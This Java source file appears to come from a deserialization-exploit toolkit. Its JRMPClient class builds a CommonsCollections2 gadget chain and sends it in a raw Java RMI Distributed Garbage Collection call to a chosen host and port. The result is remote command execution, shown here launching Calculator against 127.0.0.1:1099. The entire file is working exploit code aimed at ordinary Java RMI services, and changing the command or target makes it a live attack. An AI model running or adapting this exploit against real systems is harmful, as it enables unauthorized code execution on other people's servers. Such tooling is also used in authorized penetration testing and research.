package com.ppp.exploit;


import com.ppp.ExploitBuilder;
import com.ppp.ExploitHelper;
import com.ppp.ObjectPayload;
import com.ppp.Printer;
import com.ppp.chain.commonscollections3.CommonsCollections1;
import com.ppp.chain.commonscollections4.CommonsCollections2;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import sun.rmi.transport.TransportConstants;

import javax.net.SocketFactory;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.*;


/**
 * Generic JRMP client
 * <p>
 * Pretty much the same thing as {@link RMIRegistryExploit} but
 * - targeting the remote DGC (Distributed Garbage Collection, always there if there is a listener)
 * - not deserializing anything (so you don't get yourself exploited ;))
 *
 * @author mbechler
 */
@Exploit
public class JRMPClient implements ExploitPayload {
    public static void main(String[] args) throws Exception {
        Class<? extends ObjectPayload> gadgetClass = CommonsCollections2.class;
        ObjectPayload objectPayload = gadgetClass.newInstance();

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setCommand("open -a Calculator.app");
        sinksHelper.setSink(gadgetClass.getAnnotation(Sink.class).value()[0]);
        Object gadget = objectPayload.getObject(sinksHelper);

        ExploitHelper exploitHelper = new ExploitHelper();
        exploitHelper.setHost("127.0.0.1");
        exploitHelper.setPort(Integer.parseInt("1099"));

        ExploitBuilder.run(ExploitBuilder.getExploitClass("JRMPClient"), gadget, exploitHelper);
    }

    @Override
    public void exploit(Object gadget, ExploitHelper exploitHelper) {
        try {
            String host = exploitHelper.getHost();
            int port = exploitHelper.getPort();
            Printer.yellowInfo("Exploit send to " + host + ":" + port);
            makeDGCCall(host, port, gadget);
        } catch (Throwable e) {
            Printer.warn(e.getMessage());
        }
    }

    public static void makeDGCCall(String hostname, int port, Object payloadObject) throws Exception {
        InetSocketAddress isa = new InetSocketAddress(hostname, port);
        Socket s = null;
        DataOutputStream dos = null;
        try {
            s = SocketFactory.getDefault().createSocket(hostname, port);
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            OutputStream os = s.getOutputStream();
            dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);

            dos.write(TransportConstants.Call);

            @SuppressWarnings("resource") final ObjectOutputStream objOut = new MarshalOutputStream(dos);

            objOut.writeLong(2); // DGC
            objOut.writeInt(0);
            objOut.writeLong(0);
            objOut.writeShort(0);

            objOut.writeInt(1); // dirty
            objOut.writeLong(-669196253586618813L);

            objOut.writeObject(payloadObject);

            os.flush();
        } finally {
            if (dos != null) {
                dos.close();
            }
            if (s != null) {
                s.close();
            }
        }
    }

    static final class MarshalOutputStream extends ObjectOutputStream {


        private URL sendUrl;

        public MarshalOutputStream(OutputStream out, URL u) throws IOException {
            super(out);
            this.sendUrl = u;
        }

        MarshalOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                writeObject(this.sendUrl.toString());
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                writeObject(null);
            } else {
                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                String cb = "";

                for (URL u : us) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }


        /**
         * Serializes a location from which to load the specified class.
         */
        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }


}
